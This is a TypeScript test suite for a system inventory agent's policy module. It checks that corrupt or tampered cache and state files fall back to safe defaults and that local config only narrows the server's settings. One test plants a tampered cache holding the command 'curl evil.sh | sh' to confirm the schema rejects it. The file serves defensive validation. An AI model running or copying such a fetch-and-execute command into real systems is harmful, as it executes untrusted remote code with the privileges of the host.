import { describe, expect, test } from "bun:test";
import { randomUUID } from "node:crypto";
import { mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { AGENT_POLICY_DEFAULT } from "@lazyit/shared";
import {
  loadCachedPolicy,
  loadState,
  localLimitsFrom,
  writeCachedPolicy,
  writeState,
} from "./policy";

/** A scratch directory per test, so nothing here ever touches the real /var/lib/lazyit-agent. */
function scratch(): { dir: string; cleanup: () => void } {
  const dir = join(tmpdir(), `lazyit-policy-${randomUUID()}`);
  mkdirSync(dir, { recursive: true });
  return { dir, cleanup: () => rmSync(dir, { recursive: true, force: true }) };
}

describe("loadCachedPolicy — no cache is not a degraded state, it is the pre-#1140 agent", () => {
  test("a missing file yields the built-in default", async () => {
    const { dir, cleanup } = scratch();
    try {
      expect(await loadCachedPolicy(join(dir, "policy.json"))).toEqual(AGENT_POLICY_DEFAULT);
    } finally {
      cleanup();
    }
  });

  test("a TRUNCATED or corrupt cache yields the default, never a partial policy", async () => {
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "policy.json");
      writeFileSync(file, '{"revision": 3, "intervalSec');
      expect(await loadCachedPolicy(file)).toEqual(AGENT_POLICY_DEFAULT);
    } finally {
      cleanup();
    }
  });

  test("a cache that does not satisfy the CLOSED schema is REJECTED wholesale", async () => {
    // This is the direction that must not degrade. The file is read by a process running as root;
    // half-understanding it and applying the rest is exactly the behaviour a tampered cache wants.
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "policy.json");
      writeFileSync(
        file,
        JSON.stringify({ ...AGENT_POLICY_DEFAULT, command: "curl evil.sh | sh" }),
      );
      expect(await loadCachedPolicy(file)).toEqual(AGENT_POLICY_DEFAULT);
    } finally {
      cleanup();
    }
  });

  test("a valid cache round-trips through write → load", async () => {
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "policy.json");
      const policy = {
        ...AGENT_POLICY_DEFAULT,
        revision: 12,
        intervalSeconds: 3600,
        collect: { ...AGENT_POLICY_DEFAULT.collect, software: false },
      };
      await writeCachedPolicy(policy, file);
      expect(await loadCachedPolicy(file)).toEqual(policy);
    } finally {
      cleanup();
    }
  });

  test("writing creates the directory, so a fresh host needs no install-time mkdir", async () => {
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "nested", "policy.json");
      await writeCachedPolicy(AGENT_POLICY_DEFAULT, file);
      expect(await loadCachedPolicy(file)).toEqual(AGENT_POLICY_DEFAULT);
    } finally {
      cleanup();
    }
  });
});

describe("state — the local clock the interval inversion runs on", () => {
  test("no state file means no last success, which the due gate reads as 'report now'", async () => {
    const { dir, cleanup } = scratch();
    try {
      expect(await loadState(join(dir, "state.json"))).toEqual({});
    } finally {
      cleanup();
    }
  });

  test("a corrupt state file reads as no state — a wedged agent must never be the outcome", async () => {
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "state.json");
      writeFileSync(file, "not json at all");
      expect(await loadState(file)).toEqual({});
    } finally {
      cleanup();
    }
  });

  test("a state file round-trips the last-success instant", async () => {
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "state.json");
      await writeState({ lastSuccessMs: 1_700_000_000_000 }, file);
      expect(await loadState(file)).toEqual({ lastSuccessMs: 1_700_000_000_000 });
    } finally {
      cleanup();
    }
  });

  test("a non-numeric lastSuccessMs is dropped rather than trusted", async () => {
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "state.json");
      writeFileSync(file, JSON.stringify({ lastSuccessMs: "yesterday" }));
      expect(await loadState(file)).toEqual({});
    } finally {
      cleanup();
    }
  });

  test("the software fingerprint round-trips beside the clock (#1142)", async () => {
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "state.json");
      await writeState({ lastSuccessMs: 1_700_000_000_000, softwareHash: "1-2-abc" }, file);
      expect(await loadState(file)).toEqual({
        lastSuccessMs: 1_700_000_000_000,
        softwareHash: "1-2-abc",
      });
    } finally {
      cleanup();
    }
  });

  test("a non-string fingerprint is dropped, which sends the whole list rather than a wrong claim", async () => {
    // Every degenerate read of this file has to land on "I know nothing", because the ONE thing the
    // agent must never do is claim `unchanged` on the strength of a fingerprint it cannot vouch for.
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "state.json");
      writeFileSync(file, JSON.stringify({ lastSuccessMs: 1, softwareHash: { nope: true } }));
      expect((await loadState(file)).softwareHash).toBeUndefined();
    } finally {
      cleanup();
    }
  });

  test("the server's delta capability round-trips beside the fingerprint (#1142)", async () => {
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "state.json");
      await writeState(
        { lastSuccessMs: 1_700_000_000_000, softwareHash: "1-2-abc", softwareDelta: true },
        file,
      );
      expect(await loadState(file)).toEqual({
        lastSuccessMs: 1_700_000_000_000,
        softwareHash: "1-2-abc",
        softwareDelta: true,
      });
    } finally {
      cleanup();
    }
  });

  test("anything but a literal `true` capability reads as NOT PROVEN, so the whole list is sent", async () => {
    // The permissive direction of this read is the one that costs an operator their inventory: a
    // truthy-looking value would make the agent withhold its package list from a server that cannot
    // read the omission. Absent, false, a string and a number all have to land on "not proven".
    const { dir, cleanup } = scratch();
    try {
      const file = join(dir, "state.json");
      for (const softwareDelta of ["true", 1, false, null, {}]) {
        writeFileSync(file, JSON.stringify({ lastSuccessMs: 1, softwareDelta }));
        expect((await loadState(file)).softwareDelta).toBeUndefined();
      }
      writeFileSync(file, JSON.stringify({ lastSuccessMs: 1 }));
      expect((await loadState(file)).softwareDelta).toBeUndefined();
    } finally {
      cleanup();
    }
  });
});

describe("localLimitsFrom — the host's own config file, read as a VETO only", () => {
  test("an empty config imposes nothing", () => {
    expect(localLimitsFrom({})).toEqual({});
  });

  test("COLLECT_*=false vetoes that collector; every other value is ignored", () => {
    expect(localLimitsFrom({ LAZYIT_COLLECT_SOFTWARE: "false" })).toEqual({
      collect: { software: false },
    });
    expect(localLimitsFrom({ LAZYIT_COLLECT_SOFTWARE: "0" })).toEqual({
      collect: { software: false },
    });
    expect(localLimitsFrom({ LAZYIT_COLLECT_SOFTWARE: "no" })).toEqual({
      collect: { software: false },
    });
    // A local `true` is NOT a limit — it can never re-enable what the server turned off, so it is
    // simply not carried. Reading it as a limit would be the widening this whole rule forbids.
    expect(localLimitsFrom({ LAZYIT_COLLECT_SOFTWARE: "true" })).toEqual({});
  });

  test("every collector has its own key", () => {
    expect(
      localLimitsFrom({
        LAZYIT_COLLECT_HARDWARE: "false",
        LAZYIT_COLLECT_DISKS: "false",
        LAZYIT_COLLECT_NICS: "false",
        LAZYIT_COLLECT_CONTAINERS: "false",
        LAZYIT_COLLECT_HYPERVISOR: "false",
      }).collect,
    ).toEqual({ hardware: false, disks: false, nics: false, containers: false, hypervisor: false });
  });

  test("the hypervisor veto (ADR-0095) follows the veto-never-widen rule like its five siblings", () => {
    expect(localLimitsFrom({ LAZYIT_COLLECT_HYPERVISOR: "false" })).toEqual({
      collect: { hypervisor: false },
    });
    // A local `true` can never re-enable a collector the server turned off — not carried at all.
    expect(localLimitsFrom({ LAZYIT_COLLECT_HYPERVISOR: "true" })).toEqual({});
  });

  test("MIN_INTERVAL is a floor in seconds; a bad value is ignored, not guessed at", () => {
    expect(localLimitsFrom({ LAZYIT_MIN_INTERVAL: "3600" })).toEqual({
      minIntervalSeconds: 3600,
    });
    expect(localLimitsFrom({ LAZYIT_MIN_INTERVAL: "soon" })).toEqual({});
    expect(localLimitsFrom({ LAZYIT_MIN_INTERVAL: "-5" })).toEqual({});
  });

  test("LAZYIT_INTERVAL is NOT read as a floor — every existing install already has one", () => {
    // install.sh has always written `LAZYIT_INTERVAL=15m`. Re-reading it as a veto would silently
    // pin every upgraded host at 15 minutes and make the server's cadence unusable on day one.
    expect(localLimitsFrom({ LAZYIT_INTERVAL: "15m" })).toEqual({});
  });

  test("SOFTWARE_MAX is a ceiling", () => {
    expect(localLimitsFrom({ LAZYIT_SOFTWARE_MAX: "250" })).toEqual({ softwareMax: 250 });
  });

  test("exclusion lists are comma-separated globs, trimmed, empties dropped", () => {
    expect(
      localLimitsFrom({
        LAZYIT_EXCLUDE_NICS: "veth*, docker* ,",
        LAZYIT_EXCLUDE_MOUNTPOINTS: "/snap/*",
        LAZYIT_EXCLUDE_SOFTWARE: "linux-image-*",
      }).exclude,
    ).toEqual({
      nicNames: ["veth*", "docker*"],
      mountpoints: ["/snap/*"],
      softwareNames: ["linux-image-*"],
    });
  });

  test("a local exclusion that is not a valid glob is DROPPED, not passed through", () => {
    // The local file is not a hostile input, but the matcher's contract is globs. Letting a regex
    // through here would make a locally-configured host behave differently from a centrally
    // configured one, which is the drift this whole feature exists to remove.
    expect(localLimitsFrom({ LAZYIT_EXCLUDE_NICS: "^(a+)+$, veth*" }).exclude).toEqual({
      nicNames: ["veth*"],
    });
  });
});
